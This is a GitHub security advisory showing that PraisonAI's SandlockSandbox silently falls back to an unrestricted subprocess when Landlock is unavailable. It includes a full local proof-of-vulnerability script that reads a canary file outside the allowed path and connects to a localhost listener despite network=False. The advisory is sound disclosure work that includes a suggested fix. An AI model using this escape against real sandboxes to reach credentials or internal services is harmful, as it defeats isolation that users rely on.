# [H] PraisonAI SandlockSandbox falls back to unrestricted subprocess execution when Landlock is unavailable

## Summary
Severity: High
Advisory: GHSA-6jcq-6546-qrrw
CVE: CVE-2026-57144
CWE: CWE-266, CWE-668, CWE-693
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-6jcq-6546-qrrw
Type: github-advisory

## Affected
- PyPI: `praisonai` — affected >=4.5.110 <4.6.61

## Details
## Summary

`praisonai.sandbox.SandlockSandbox` is documented and implemented as the kernel-enforced sandbox backend for untrusted code. Its `SandboxConfig.native()` path lets callers configure allowed filesystem paths and `network=False`.

On systems where the optional `sandlock` module imports but reports that Landlock is unavailable, `SandlockSandbox.execute()` and `run_command()` do not fail closed. They silently fall back to `SubprocessSandbox(self.config)`.

That fallback keeps the same high-level native policy object but does not enforce the native filesystem or network boundary during code execution. A sandboxed payload can read files outside the configured allowed path and open network connections despite `network=False`.

## Technical Details

`SandboxConfig.native()` creates a restricted native policy and records caller-provided writable paths plus the requested network posture:

```python
return cls(
    sandbox_type="native",
    working_dir=os.getcwd(),
    security_policy=SecurityPolicy(
        allow_network=network,
        allow_file_write=True,
        allow_subprocess=True,
        allowed_paths=resolved_paths,
    ),
    metadata={"writable_paths": resolved_paths, "network": network},
)
```

`SandlockSandbox` builds the intended kernel policy with Landlock-backed filesystem allowlisting and network denial:

```python
policy = Policy(
    fs_readable=allowed_read_paths,
    fs_writable=allowed_write_paths,
    net_allow_hosts=[] if not limits.network_enabled else None,
    max_memory=f"{limits.memory_mb}M",
    max_processes=limits.max_processes,
    max_open_files=limits.max_open_files,
)
```

However, both execution paths fail open when Sandlock is unavailable:

```python
if not self.is_available:
    logger.warning("Sandlock not available, falling back to subprocess")
    from .subprocess import SubprocessSandbox
    fallback = SubprocessSandbox(self.config)
    return await fallback.execute(code, language, limits, env, working_dir)
```

`SubprocessSandbox.execute()` writes the code to a temp file and runs `python` with a minimal environment and POSIX rlimits. It does not install a filesystem sandbox, network namespace, syscall filter, chroot, Landlock policy, or path allowlist for the code execution path. The `safe_sandbox_path()` checks only protect the `read_file()`, `write_file()`, and `list_files()` helper methods.

### Why This Is Not Intended Behavior

The report is not based only on a trust-model disagreement. The code and docs define a concrete boundary:

- PraisonAI's Sandlock README says the backend provides kernel-level filesystem allowlisting, network isolation, seccomp filtering, and blocks `/etc/passwd`, SSH keys, AWS credentials, and unauthorized connections.
- The security demo creates `SandboxConfig.native(writable_paths=["./safe_workspace"], network=False)` and labels file and network access as blocked operations.
- The upstream `sandlock` package requires Linux with a compatible Landlock ABI and documents a fail-closed default for missing required protections unless the caller explicitly opts into degraded protection.
- PraisonAI's own current security page recommends sandboxed execution and says path traversal protection is enabled by default for local sandbox backends.

The bug is the silent fallback from an unavailable kernel-enforced boundary to plain subprocess execution without preserving the configured native policy.

## PoV

Run from a PraisonAI source checkout:

```bash
python3 poc/pov_poc.py \
  --repo /path/to/PraisonAI
```

The PoV:

1. injects a fake `sandlock` module that imports successfully but reports no usable Landlock support;
2. configures `SandboxConfig.native(writable_paths=[tenant_a], network=False)`;
3. creates `tenant-b-secret.txt` outside the configured path;
4. starts a localhost TCP listener;
5. executes code through `SandlockSandbox.execute()`.

Observed result on `v4.6.58`:

```json
{
  "child_output": {
    "network_reply": "local-ok",
    "outside_read": "TENANT_B_CANARY"
  },
  "configured_network": false,
  "outside_path_under_allowed": false,
  "sandlock_available": false,
  "sandbox_type": "sandlock",
  "status": "COMPLETED",
  "vulnerable": true
}
```

This proves both policy boundaries are crossed:

- the file read target is not under the configured allowed path;
- the localhost network connection succeeds even though the native policy was created with `network=False`.

Full PoV script:

```python
#!/usr/bin/env python3
"""Local-only PoV for poc.

The PoV simulates a system where the optional ``sandlock`` Python package is
installed but kernel Landlock support is unavailable. That is the exact branch
handled by ``SandlockSandbox.execute()``: it logs a warning and falls back to
``SubprocessSandbox``.

No external network is used. The network control is a localhost TCP listener.
No sensitive host files are read. The filesystem control uses temporary tenant
directories and a canary file outside the configured writable path.
"""

from __future__ import annotations

import argparse
import asyncio
import contextlib
import json
import os
import pathlib
import socket
import sys
import tempfile
import types
from typing import Any

def _repo_paths(repo: pathlib.Path) -> list[str]:
    return [
        str(repo / "src" / "praisonai"),
        str(repo / "src" / "praisonai-agents"),
    ]

async def _accept_once(server: socket.socket) -> str | None:
    loop = asyncio.get_running_loop()

    def accept() -> str:
        conn, _ = server.accept()
        with conn:
            data = conn.recv(128)
            conn.sendall(b"local-ok")
        return data.decode("utf-8", "replace")

    with contextlib.suppress(Exception):
        return await loop.run_in_executor(None, accept)
    return None

async def run_pov(repo: pathlib.Path) -> dict[str, Any]:
    sandlock_path = repo / "src" / "praisonai" / "praisonai" / "sandbox" / "sandlock.py"
    if not sandlock_path.exists():
        return {"repo": str(repo), "has_sandlock": False, "vulnerable": False}

    sys.path[:0] = _repo_paths(repo)

    # Support both the original v4.5.110 API check and the current v4.6.58 API
    # check while forcing the "Sandlock not available" branch.
    sys.modules["sandlock"] = types.SimpleNamespace(
        is_available=lambda: False,
        landlock_abi_version=lambda: 0,
    )

    from praisonai.sandbox.sandlock import SandlockSandbox
    from praisonaiagents.sandbox import ResourceLimits, SandboxConfig

    with tempfile.TemporaryDirectory(prefix="poc-") as temp_root:
        base = pathlib.Path(temp_root)

        # Make the PoV deterministic on systems where "python" is not on PATH.
        bindir = base / "bin"
        bindir.mkdir()
        (bindir / "python").symlink_to(sys.executable)

        allowed = base / "tenant-a"
        allowed.mkdir()
        outside = base / "tenant-b-secret.txt"
        outside.write_text("TENANT_B_CANARY", encoding="utf-8")

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(("127.0.0.1", 0))
        server.listen(1)
        server.settimeout(5)
        port = server.getsockname()[1]

        config = SandboxConfig.native(writable_paths=[str(allowed)], network=False)
        sandbox = SandlockSandbox(config=config)
        await sandbox.start()

        code = f"""
import json
import socket

result = {{}}

try:
    with open({str(outside)!r}, "r") as f:
        result["outside_read"] = f.read()
except Exception as exc:
    result["outside_read_error"] = type(exc).__name__ + ": " + str(exc)

try:
    s = socket.create_connection(("127.0.0.1", {port}), timeout=3)
    s.sendall(b"hello")
    result["network_reply"] = s.recv(32).decode("utf-8", "replace")
    s.close()
except Exception as exc:
    result["network_error"] = type(exc).__name__ + ": " + str(exc)

print(json.dumps(result, sort_keys=True))
"""

        accept_task = asyncio.create_task(_accept_once(server))
        result = await sandbox.execute(
            code,
            limits=ResourceLimits(
                timeout_seconds=10,
                memory_mb=512,
                max_processes=10,
                max_open_files=64,
                network_enabled=False,
            ),
            env={"PATH": str(bindir)},
        )

        accepted_payload = None
        with contextlib.suppress(Exception):
            accepted_payload = await accept_task

        server.close()
        await sandbox.stop()

        child_output: dict[str, Any] = {}
        with contextlib.suppress(Exception):
            child_output = json.loads(result.stdout.strip())

        vulnerable = (
            child_output.get("outside_read") == "TENANT_B_CANARY"
            and child_output.get("network_reply") == "local-ok"
        )

        return {
            "repo": str(repo),
            "has_sandlock": True,
            "sandbox_type": sandbox.sandbox_type,
            "sandlock_available": sandbox.is_available,
            "configured_allowed_paths": config.security_policy.allowed_paths,
            "configured_network": config.security_policy.allow_network,
            "outside_path_under_allowed": str(outside).startswith(str(allowed) + os.sep),
            "status": getattr(result.status, "name", str(result.status)),
            "exit_code": result.exit_code,
            "stdout": result.stdout.strip(),
            "stderr": result.stderr.strip(),
            "error": result.error,
            "child_output": child_output,
            "accepted_local_payload": accepted_payload,
            "vulnerable": vulnerable,
        }

def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--repo", required=True, type=pathlib.Path)
    args = parser.parse_args()

    result = asyncio.run(run_pov(args.repo.resolve()))
    print(json.dumps(result, indent=2, sort_keys=True))

    if result.get("has_sandlock") and not result.get("vulnerable"):
        return 1
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
```

## PoC

The PoV section above contains the local reproduction command, input, and decisive output.

## Impact

If a PraisonAI user or service relies on `SandlockSandbox` / native sandboxing for untrusted code isolation on a host without the required Landlock support, code submitted to the sandbox can execute with the host user's normal filesystem and network access.

Concrete impact includes:

- reading files outside the configured tenant/workspace path;
- reading project files, credentials, `.env` files, SSH material, or cloud config reachable by the PraisonAI process user;
- connecting to loopback or internal services despite `network=False`;
- moving from sandboxed code execution to unsandboxed host-user code execution in deployments that treat Sandlock as the isolation boundary.

The local PoV does not read real sensitive files or contact external systems. It uses temporary tenant directories and a localhost TCP listener.

## Suggested Fix

Fail closed when the requested native sandbox boundary cannot be enforced.

Recommended changes:

1. In `SandlockSandbox.execute()` and `run_command()`, return a failed `SandboxResult` or raise a clear runtime error when `self.is_available` is false.
2. If fallback behavior is kept for developer convenience, require an explicit opt-in such as `allow_degraded=True` or `fallback="subprocess"` and surface that degraded state in the result metadata.
3. Do not preserve `sandbox_type == "sandlock"` in status metadata when the actual execution backend is subprocess.
4. Add regression tests proving that unavailable Landlock does not execute code unless degraded fallback was explicitly requested.
5. Add tests that a native policy with `network=False` and a restricted path cannot read outside-path canaries or connect to a localhost listener.
6. Document the required kernel/ABI versions and the exact degraded-mode semantics.

## Affected Package/Versions

- Repository: `MervinPraison/PraisonAI`
- Package: `praisonai`
- Component: `src/praisonai/praisonai/sandbox/sandlock.py`
- Related config component: `src/praisonai-agents/praisonaiagents/sandbox/config.py`
- Latest verified release/current head: `v4.6.58`, `1ad58ca02975ff1398efeda694ea2ab78f20cf3e`

Confirmed affected:

```text
v4.5.110  vulnerable
v4.5.120  vulnerable
v4.6.58   vulnerable
current   vulnerable
```

Negative control:

```text
v4.5.109  not affected because SandlockSandbox is absent
```

Suggested affected range: `>= 4.5.110, <= 4.6.58`.

No fixed version is known at submission time.

### Version Sweep

```text
version              has_sandlock  sandlock_available  status     outside_read     network_reply  vulnerable
praisonai-v4.5.109   false                                               false
praisonai-v4.5.110   true          false               COMPLETED  TENANT_B_CANARY  local-ok       true
praisonai-v4.6.58    true          false               COMPLETED  TENANT_B_CANARY  local-ok       true
praisonai-current    true          false               COMPLETED  TENANT_B_CANARY  local-ok       true
```

GitHub history for `sandlock.py` shows the backend was introduced in `4ee7d298c89f` on 2026-04-01 with "graceful fallback to SubprocessSandbox", then updated in `7ae6c6d19c31` on 2026-04-02 to use the current Landlock ABI check.

## Advisory History

Nearby advisories are distinct:

- `GHSA-r4f2-3m54-pp7q` / `CVE-2026-34955`: `SubprocessSandbox` shell command escape through `4.5.96`.
- `GHSA-4mr5-g6f9-cfrh`, `GHSA-qf73-2hrx-xprp`, `GHSA-6vh2-h83c-9294`: `execute_code()` Python sandbox escapes.
- `GHSA-ch89-h4r2-c8f8`: agent tools workspace escape via symlinks.
- `GHSA-gcq3-mfvh-3x25`: PraisonAI Code agent tool workspace fail-open.

This report covers a different root cause: `SandlockSandbox` / native sandbox policy downgrade when Landlock is unavailable. It reproduces on the latest release `v4.6.58`, while the older `SubprocessSandbox` shell escape advisory was fixed at `4.5.97`.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-6jcq-6546-qrrw
- https://github.com/MervinPraison/PraisonAI
